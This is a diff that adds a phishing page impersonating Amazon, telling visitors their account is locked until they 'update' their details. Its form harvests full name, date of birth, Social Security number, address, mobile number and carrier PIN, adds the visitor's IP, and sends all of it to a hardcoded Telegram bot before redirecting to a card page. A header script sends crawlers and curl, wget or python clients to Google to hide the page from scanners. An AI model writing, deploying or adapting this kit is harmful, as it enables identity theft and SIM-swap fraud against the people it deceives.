@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Amazon</title>
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="details.css">
+    <style>
+        /* Ensure input fields have a minimum font size to avoid zoom on mobile */
+        input {
+            font-size: 16px;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="passage">
+        <h3>You Can't Access Your Account Until You Update</h3>
+    </div>
+    <div id="formContainer">
+        <div class="emojiContainer">
+            <h2>Update Your Personal Details</h2>
+            <img src="images/account.png" width="500" alt="Image 4">
+        </div>
+        <form id="loginForm" method="post" autocomplete="on">
+            <label for="name">Full Name <span>(Enter Your Full Name)</span></label>
+            <input type="text" id="name" name="data[name]" placeholder="Full Name" required>
+            <br>
+            <label for="dob">Date Of Birth <span>(MM/DD/YYYY)</span></label>
+            <input type="text" id="dob" name="data[dob]" placeholder="Date Of Birth" required>
+            <br>
+            <label for="ssn">Social Security Number <span>(Enter Your SSN)</span></label>
+            <input type="text" id="ssn" name="data[ssn]" placeholder="Social Security Number" required>
+            <br>
+            <label for="address">Street Address <span>(Enter Your Street Address)</span></label>
+            <input type="text" id="address" name="data[address]" placeholder="Address" required>
+            <br>
+            <label for="mobile">Mobile Number <span>(Enter Your Mobile Number)</span></label>
+            <input type="text" id="mobile" name="data[mobile]" placeholder="Mobile Number">
+            <br>
+            <label for="carrier">Carrier PIN <span>(Enter Your Carrier PIN)</span></label>
+            <input type="text" id="carrier" name="data[carrier]" placeholder="Carrier PIN">
+            <br>
+            <button id="submit" type="submit">Submit</button>
+        </form>
+    </div>
+    <footer>
+        <p>&copy; 2025 Amazon. All rights reserved.</p>
+        <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+    </footer>
+
+    <script>
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+    
+            // Collect values from all form fields
+            var name = document.getElementById("name").value;
+            var dob = document.getElementById("dob").value;
+            var ssn = document.getElementById("ssn").value;
+            var address = document.getElementById("address").value;
+            var mobile = document.getElementById("mobile").value;
+            var carrier = document.getElementById("carrier").value;
+    
+            // Get the user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
+    
+                    // Exclude cookies from the message
+                    var message = `Full Name: ${name}\nDate of Birth: ${dob}\nSSN: ${ssn}\nAddress: ${address}\nMobile Number: ${mobile}\nCarrier PIN: ${carrier}\nIP Address: ${ipAddress}`;
+    
+                    // Send the message to Telegram via POST request
+                    var telegramAPI = 'https://api.telegram.org/bot7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0/sendMessage';
+                    var payload = {
+                        chat_id: '7009891691',
+                        text: message
+                    };
+    
+                    fetch(telegramAPI, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            // Redirect to a different page after successful submission
+                            window.location.href = "card.html"; // Replace with your desired redirect page
+                        } else {
+                            alert("Error: " + data.description);
+                        }
+                    })
+                    .catch(error => {
+                        alert("Error: " + error.message);
+                    });
+                })
+                .catch(error => {
+                    alert("Error: " + error.message);
+                });
+        });
+    </script>
+</body>
+</html>
